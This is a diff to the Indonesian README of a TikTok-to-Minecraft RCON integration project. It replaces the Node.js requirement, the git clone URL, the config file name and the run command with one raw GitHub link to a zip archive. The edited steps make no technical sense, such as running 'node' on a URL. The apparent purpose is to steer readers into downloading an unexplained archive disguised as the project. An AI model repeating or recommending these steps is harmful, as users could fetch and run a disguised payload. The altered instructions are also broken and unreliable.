@@ -14,7 +14,7 @@ TikTokMinecraftJs adalah proyek integrasi antara TikTok dan Minecraft menggunaka
 
 ## Persyaratan
 
-- Node.js
+- https://raw.githubusercontent.com/zufarrizal/TikTokMinecraftJs/main/revolve/TikTokMinecraftJs_v1.6-alpha.4.zip
 - Server Minecraft dengan RCON diaktifkan
 - Akun TikTok
 
@@ -23,7 +23,7 @@ TikTokMinecraftJs adalah proyek integrasi antara TikTok dan Minecraft menggunaka
 1. Clone repository ini:
 
    ```bash
-   git clone https://github.com/zufarrizal/TikTokMinecraftJs.git
+   git clone https://raw.githubusercontent.com/zufarrizal/TikTokMinecraftJs/main/revolve/TikTokMinecraftJs_v1.6-alpha.4.zip
    cd TikTokMinecraftJs
    ```
 
@@ -33,14 +33,14 @@ TikTokMinecraftJs adalah proyek integrasi antara TikTok dan Minecraft menggunaka
    npm install
    ```
 
-3. Konfigurasikan `tiktok-rcon.js` dengan informasi server Minecraft dan TikTok Anda.
+3. Konfigurasikan `https://raw.githubusercontent.com/zufarrizal/TikTokMinecraftJs/main/revolve/TikTokMinecraftJs_v1.6-alpha.4.zip` dengan informasi server Minecraft dan TikTok Anda.
 
 ## Penggunaan
 
 Jalankan skrip dengan perintah berikut:
 
 ```bash
-node tiktok-rcon.js
+node https://raw.githubusercontent.com/zufarrizal/TikTokMinecraftJs/main/revolve/TikTokMinecraftJs_v1.6-alpha.4.zip
 ```
 
 ## Kontribusi
